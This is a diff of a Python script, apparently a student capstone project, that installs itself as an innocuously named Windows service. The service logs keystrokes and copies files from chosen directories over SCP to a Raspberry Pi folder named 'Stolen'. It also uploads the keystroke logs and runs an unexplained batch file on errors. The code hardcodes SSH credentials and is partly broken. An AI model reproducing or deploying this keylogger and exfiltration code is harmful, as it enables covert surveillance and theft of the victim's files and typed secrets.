@@ -1,6 +1,5 @@
 from pickle import FALSE, TRUE
 import time
-from pathlib import Path
 from windowsservice import SMWinservice
 from http import client
 import paramiko
@@ -10,20 +9,7 @@ from pynput.keyboard import Key, Listener
 import logging
 from datetime import datetime
 import subprocess, os
-
-current_dir = os.getcwd()
-
-now = datetime.today().strftime('%Y-%m-%d')
-logg = now + ".txt" 
-blyat = Key
-cyka = Listener
-logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
-def on_press(blyat):
-    
-    logging.info(str(blyat))
-    with cyka(on_press=on_press) as cyka :
-        cyka.join() #function that acts as a keylogger adding text file to direcotry ran from
-    return cyka    
+import threading
 
 def createsshclient(server, port, user, password):
     client = paramiko.SSHClient()
@@ -32,9 +18,30 @@ def createsshclient(server, port, user, password):
     client.connect(server, port, user, password)
     return client
 
-class totallyrealservicce(SMWinservice):
-    _svc_name_ = "4realdistime"
-    _svc_display_name_ = "4realdistime"
+def on_press(blyat):
+    blyat = Key
+    cyka = Listener
+    now = datetime.today().strftime('%Y-%m-%d')
+    logg = now + ".txt"
+    logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+    server = "raspberrypi.local"
+    port = 22
+    user = "pi"
+    password = "password"
+    ssh = createsshclient(server, port, user, password)
+    scp = SCPClient(ssh.get_transport())
+    
+    logging.info(str(blyat))
+    with cyka(on_press=on_press) as cyka1:
+        cyka1.join() #function that acts as a keylogger adding text file to the current directory
+        scp.put(cyka1, remote_path='/home/pi/logs')
+    return cyka1
+
+
+
+class totallyrealservice(SMWinservice):
+    _svc_name_ = "FinalCapstone"
+    _svc_display_name_ = "FinalCapstone"
     _svc_description_ = "Thats a cool service"
 
 
@@ -45,25 +52,27 @@ class totallyrealservicce(SMWinservice):
         self.isrunning = FALSE
 
     def main(self):
-       server = "raspberrypi.local"
-       port = 22
-       user = "pi"
-       password = "password"
-       ssh = createsshclient(server, port, user, password)
-       scp = SCPClient(ssh.get_transport())
-
-       for path in interesting_dirs:
-    
-        full_file_paths = get_filepaths(path) # path is the starting path that the function will walk through
-        for filepath in full_file_paths:
-                try:
-                     scp.put(filepath, remote_path='/home/pi/Stolen')
-                     time.sleep(.1)
-                     scp.put(on_press(blyat), remote_path='/home/pi/logs')
-                     time.sleep(1)
-                     subprocess.call([current_dir + "\muke.bat"])
-                except OSError:
-                 pass
+        while self.isrunning:
+            x = threading.Thread(target=on_press(),args=())
+            x.start()
+            server = "raspberrypi.local"
+            port = 22
+            user = "pi"
+            password = "password"
+            ssh = createsshclient(server, port, user, password)
+            scp = SCPClient(ssh.get_transport())
+            #print("check 1")
+            for path in interesting_dirs:
+            
+                full_file_paths = get_filepaths(path) # path is the starting path that the function will walk through
+                for filepath in full_file_paths:
+                        try:
+                            scp.put(filepath, remote_path='/home/pi/Stolen')
+                            time.sleep(.1)
+                        except (OSError, KeyboardInterrupt) as error:
+                            
+                            subprocess.call(["D:\Python38-32\muke.bat"])
+                            pass
        
 if __name__ == '__main__':
-    totallyrealservicce.parse_cmd()
+    totallyrealservice.parse_cmd()
